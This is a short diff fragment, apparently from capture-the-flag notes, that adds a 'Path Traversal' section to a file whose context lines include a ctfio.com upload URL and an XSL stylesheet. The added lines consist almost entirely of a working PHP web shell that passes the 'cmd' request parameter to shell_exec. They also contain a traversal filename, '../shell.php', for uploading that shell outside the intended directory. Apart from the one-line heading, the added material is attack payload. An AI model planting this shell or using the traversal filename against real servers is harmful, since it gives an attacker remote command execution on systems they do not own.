@@ -78,3 +78,10 @@ https://xxxxxxxx.eu1.ctfio.com/pdf.php?order_id=.../uploads/e943fc9a281b6834f6a6
 </xsl:stylesheet>
 ```
 
+# Path Traversal
+
+```php
+<?php echo shell_exec($_GET["cmd"]); ?>
+```
+
+filename="../shell.php"
